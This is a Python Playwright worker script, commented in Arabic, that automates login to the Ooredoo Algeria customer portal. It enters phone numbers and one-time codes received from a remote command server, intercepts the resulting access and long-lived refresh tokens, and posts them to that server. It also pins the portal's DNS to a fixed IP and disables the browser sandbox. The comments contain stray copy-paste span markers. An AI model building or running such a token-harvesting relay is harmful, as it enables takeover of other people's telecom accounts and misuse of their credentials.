#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import gc
import os
import time
import aiohttp

try:
    import psutil
except ImportError:
    psutil = None

from playwright.async_api import async_playwright

# عنوان سيرفرك الخاص وكلمة السر
MASTER_URL = os.getenv("MASTER_URL", "http://YOUR_SERVER_IP:8080").rstrip("/")
WORKER_SECRET = os.getenv("WORKER_SECRET", "MySuperSecret123")
WORKER_ID = os.getenv("WORKER_ID", f"gh-{int(time.time())}")

TARGET_ENDPOINT = "protocol/openid-connect/token"  # نقطة اقتناص التوكن[span_5](start_span)[span_5](end_span)
START_TIME = time.time()

active_sessions = {}          # user_key -> بيانات التبويبة المفتوحة
sending_lock = asyncio.Lock() # قفل لموازنة استهلاك الرام أثناء لحظة إرسال الرمز
busy_sending = False


def get_resource_usage():
    """حساب استهلاك الرام والمعالج للسكربت وكل عمليات المتصفح التابعة له[span_6](start_span)[span_6](end_span)"""
    if not psutil:
        return 0.0, 0.0
    try:
        process = psutil.Process(os.getpid())
        mem_mb = process.memory_info().rss / (1024 * 1024)
        for child in process.children(recursive=True):
            try:
                mem_mb += child.memory_info().rss / (1024 * 1024)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        cpu_pct = psutil.cpu_percent(interval=0.1)
        return round(mem_mb, 2), round(cpu_pct, 1)
    except Exception:
        return 0.0, 0.0


async def wait_for_ram_cooldown():
    """الانتظار حتى ينخفض استهلاك الرام والمعالج للشخص السابق قبل إرسال رمز جديد"""
    gc.collect()
    wait_start = time.time()
    while time.time() - wait_start < 15:
        mem, cpu = get_resource_usage()
        if cpu <= 70.0 and mem <= 1200.0:
            break
        print(f"⚖️ [موازنة الموارد] تهدئة الرام ({mem}MB) والمعالج ({cpu}%)...", flush=True)
        await asyncio.sleep(1.2)


async def report_result(http_session, payload):
    headers = {"X-Worker-Secret": WORKER_SECRET}
    try:
        await http_session.post(f"{MASTER_URL}/api/worker/result", json=payload, headers=headers, timeout=10)
    except Exception as e:
        print(f"⚠️ فشل إرسال النتيجة للسيرفر: {e}", flush=True)


async def cleanup_tab(user_key):
    session = active_sessions.pop(user_key, None)
    if session:
        if session.get("timeout_task"):
            session["timeout_task"].cancel()
        try:
            await session["context"].close()
        except Exception:
            pass
        gc.collect()


async def tab_timeout_watcher(http_session, user_key):
    try:
        await asyncio.sleep(180)  # إغلاق التبويبة بعد 3 دقائق إذا لم يرسل الكود
        if user_key in active_sessions:
            await cleanup_tab(user_key)
            await report_result(http_session, {
                "user_key": user_key,
                "event": "error",
                "message": "انتهت مهلة الجلسة (3 دقائق) لتوفير الرام. أرسل الرقم مجدداً."
            })
    except asyncio.CancelledError:
        pass


async def handle_send_phone(browser, http_session, user_key, phone):
    """فتح تبويبة معزولة وإرسال الرمز مع موازنة استهلاك الرام[span_7](start_span)[span_7](end_span)"""
    global busy_sending
    await cleanup_tab(user_key)

    async with sending_lock:
        busy_sending = True
        try:
            await wait_for_ram_cooldown()
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                viewport={"width": 412, "height": 915},
                is_mobile=True,
                has_touch=True,
                locale="fr-FR",
            )
            page = await context.new_page()
            captured_data = {}

            # حظر الصور والخطوط والوسائط وملفات التتبع لتوفير الرام[span_8](start_span)[span_8](end_span)
            async def route_interceptor(route):
                req = route.request
                if req.resource_type in ["image", "media", "font", "stylesheet", "other"]:
                    await route.abort()
                    return
                if any(d in req.url for d in ["sc-static", "snapchat", "clevertap", "doubleclick", "google-analytics"]):
                    await route.abort()
                    return
                await route.continue_()

            await page.route("**/*", route_interceptor)

            async def on_response(response):
                if (TARGET_ENDPOINT in response.url or "token" in response.url) and response.status == 200:
                    try:
                        payload = await response.json()
                        if "refresh_token" in payload:
                            captured_data.update(payload)
                    except Exception:
                        pass

            page.on("response", lambda res: asyncio.create_task(on_response(res)))

            await page.goto("https://my.ooredoo.dz/", wait_until="commit", timeout=45000)
            phone_input = page.locator("input[inputmode='tel'], input.v-field__input, input[placeholder*='05']").first
            await phone_input.wait_for(state="visible", timeout=35000)
            await phone_input.click()
            await phone_input.fill("")
            await phone_input.type(phone, delay=30)
            await asyncio.sleep(0.4)

            submit_btn = page.locator("button.login-window-btn, button:has-text('Accéder')").first
            await submit_btn.wait_for(state="visible", timeout=15000)
            await page.wait_for_function(
                "() => { const b = document.querySelector('button.login-window-btn'); return b && !b.disabled; }",
                timeout=15000,
            )
            await submit_btn.click()

            active_sessions[user_key] = {
                "phone": phone,
                "context": context,
                "page": page,
                "captured_data": captured_data,
                "timeout_task": asyncio.create_task(tab_timeout_watcher(http_session, user_key)),
            }
            await report_result(http_session, {"user_key": user_key, "event": "otp_sent"})
        except Exception as e:
            print(f"❌ خطأ في إرسال الرمز للرقم {phone}: {e}", flush=True)
            await report_result(http_session, {"user_key": user_key, "event": "error", "message": "تعذر إرسال الرمز، أعد المحاولة."})
        finally:
            gc.collect()
            await asyncio.sleep(0.8)
            busy_sending = False


async def handle_send_otp(http_session, user_key, otp_code):
    """إدخال كود التحقق واستخراج الـ Refresh Token ثم إغلاق التبويبة فوراً[span_9](start_span)[span_9](end_span)"""
    session = active_sessions.get(user_key)
    if not session:
        await report_result(http_session, {"user_key": user_key, "event": "error", "message": "انتهت الجلسة، أرسل الرقم من جديد."})
        return

    page = session["page"]
    phone = session["phone"]
    captured_data = session["captured_data"]

    try:
        otp_inputs = await page.locator(".v-otp-input input, input[inputmode='numeric'], input[type='number']").all()
        if len(otp_inputs) >= 6:
            for idx, digit in enumerate(otp_code):
                try:
                    await otp_inputs[idx].fill(digit)
                except Exception:
                    await otp_inputs[idx].click()
                    await page.keyboard.type(digit)
                await asyncio.sleep(0.04)
        else:
            await page.keyboard.type(otp_code, delay=40)

        await asyncio.sleep(0.5)
        verify_btn = page.locator("button.login-window-btn, button:has-text('Vérifier'), button:has-text('Valider'), button:has-text('Confirmer')").first
        if await verify_btn.is_visible():
            await verify_btn.click()

        wait_start = time.time()
        while time.time() - wait_start < 20:
            if "refresh_token" in captured_data:
                break
            await asyncio.sleep(0.3)

        if "refresh_token" in captured_data:
            token_data = {
                "phone": phone,
                "access_token": captured_data.get("access_token"),
                "refresh_token": captured_data.get("refresh_token"),
                "expires_in_days": captured_data.get("refresh_expires_in", 15552000) // 86400,
            }
            await report_result(http_session, {"user_key": user_key, "event": "token_captured", "token_data": token_data})
        else:
            await report_result(http_session, {"user_key": user_key, "event": "error", "message": "الرمز غير صحيح أو لم يتم استخراج التوكن."})
    except Exception:
        await report_result(http_session, {"user_key": user_key, "event": "error", "message": "حدث خطأ أثناء التحقق من الرمز."})
    finally:
        await cleanup_tab(user_key)


async def main():
    # إعدادات المتصفح المخفي لأدنى استهلاك للرام والمعالج[span_10](start_span)[span_10](end_span)
    browser_args = [
        "--headless=new", "--disable-gpu", "--disable-dev-shm-usage",
        "--no-sandbox", "--disable-setuid-sandbox", "--disable-extensions",
        "--disable-background-networking", "--disable-sync", "--disable-translate",
        "--mute-audio", "--no-first-run", "--blink-settings=imagesEnabled=false",
        "--js-flags=--max-old-space-size=96", "--renderer-process-limit=1",
        "--host-resolver-rules=MAP my.ooredoo.dz 80.88.14.189",
    ]

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=browser_args)
        headers = {"X-Worker-Secret": WORKER_SECRET}

        async with aiohttp.ClientSession() as http_session:
            while True:
                mem, cpu = get_resource_usage()
                uptime = int(time.time() - START_TIME)
                payload = {
                    "worker_id": WORKER_ID,
                    "ram": mem,
                    "cpu": cpu,
                    "active_tabs": len(active_sessions),
                    "busy_sending": busy_sending,
                    "uptime": uptime,
                }
                print(f"📊 [{WORKER_ID}] RAM: {mem}MB | CPU: {cpu}% | Tabs: {len(active_sessions)} | Uptime: {uptime//60}m", flush=True)

                try:
                    async with http_session.post(f"{MASTER_URL}/api/worker/poll", json=payload, headers=headers, timeout=25) as resp:
                        cmd = await resp.json()
                        action = cmd.get("action")

                        if action == "send_phone":
                            asyncio.create_task(handle_send_phone(browser, http_session, cmd["user_key"], cmd["phone"]))
                        elif action == "send_otp":
                            asyncio.create_task(handle_send_otp(http_session, cmd["user_key"], cmd["otp"]))
                        elif action == "shutdown":
                            print("🛑 انتهت فترة الـ 6 ساعات وتم تشغيل البديل، جاري الإغلاق الآمن...", flush=True)
                            break
                except Exception as e:
                    print(f"⚠️ انتظار الاتصال بالسيرفر الرئيسي: {e}", flush=True)
                    await asyncio.sleep(3)

        await browser.close()


if __name__ == "__main__":
    asyncio.run(main())
